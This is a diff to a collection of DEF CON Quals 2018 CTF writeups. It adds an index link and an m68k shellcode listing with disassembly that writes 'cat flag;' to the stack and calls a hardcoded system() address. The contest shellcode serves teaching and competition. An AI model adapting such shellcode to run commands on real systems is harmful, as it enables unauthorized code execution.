@@ -8,7 +8,7 @@ This is the collection of writeups for the DEF CON Quals 2018 by the Mhackeroni 
 
 Index
 -------
-[Adamtune](#adamtune) - [Babypwn1805](#babypwn1805) - [Bitflipper](#bitflipper) - [Ddtek: Preview](#ddtek-preview) - [Easy Pisy](#easy-pisy) - [Elastic Cloud Compute](#elastic-cloud-compute) - [ELF Crumble](#elf-crumble) - [Exzendtential-crisis](#exzendtential-crisis) - [Flagsifier](#flagsifier) - [Geckome](#geckome) - [Ghettohackers: Throwback](#ghettohackers-throwback) - [It's-a me!](#its-a-me) - [Note Oriented Programming](#note-oriented-programming) - [Official](#official) - [PHP Eval White-List](#php-eval-white-list) - [Ps-secure](#ps-secure) - [Race Wars](#race-wars) - [Sbva](#sbva) - [Shellql](#shellql) - [TechSupport](#techsupport) - [You Already Know](#you-already-know)
+[Adamtune](#adamtune) - [Babypwn1805](#babypwn1805) - [Bitflipper](#bitflipper) - [Ddtek: Preview](#ddtek-preview) - [Easy Pisy](#easy-pisy) - [Elastic Cloud Compute](#elastic-cloud-compute) - [ELF Crumble](#elf-crumble) - [Exzendtential-crisis](#exzendtential-crisis) - [Flagsifier](#flagsifier) - [Geckome](#geckome) - [Ghettohackers: Throwback](#ghettohackers-throwback) - [It's-a me!](#its-a-me) - [Note Oriented Programming](#note-oriented-programming) - [Official](#official) - [PHP Eval White-List](#php-eval-white-list) - [Ps-secure](#ps-secure) - [Race Wars](#race-wars) - [Sbva](#sbva) - [Shellql](#shellql) - [TechSupport](#techsupport) - [WWW](#www) - [You Already Know](#you-already-know)
 #### [Comments section](#disqus_thread)
 
 
@@ -3329,6 +3329,36 @@ while True:
         i += 1
 
 
+```
+
+### Shellcode 
+
+```
+\x2c\x4f                    ## moveal %sp,%fp                
+\xb5\x82                    ## eorl %d2,%d2
+\x06\x82\x63\x61\x74\x20    ## addil #1667331104,%d2 --> 'cat '
+\x2c\xc2                    ## moveal %d2,%fp@+
+
+\xb5\x82                    ## eorl %d2,%d2
+\x06\x82\x66\x6c\x61\x67    ## addil #1718378855,%d2 --> 'flag'
+\x2c\xc2                    ## moveal %d2,%fp@+
+
+\xb5\x82                    ## eorl %d2,%d2
+\x06\x82\x3b\x20\x20\x20    ## addil #991961120,%d2 --> ';   '
+\x2c\xc2                    ## moveal %d2,%fp@+
+
+. x4: we repeated 'cat flag;   ' to make the  
+. output appear under the browser window..
+
+\xb5\x82                    ## eorl %d2,%d2
+\x2c\xc2                    ## moveal %d2,%fp@+
+
+\x22\x0f                    ## moveal %sp,%d1
+\x59\x8f                    ## subql #4,%sp
+\x2e\x81                    ## moveal %d1,%sp@
+\x2c\x4f                    ## moveal %sp,%fp
+\x45\xf9\x05\x03\x07\xf8    ## lea 0x050307f8,%a2 --> system() address
+\x4e\x92                    ## jsr %a2@
 ```
 
 
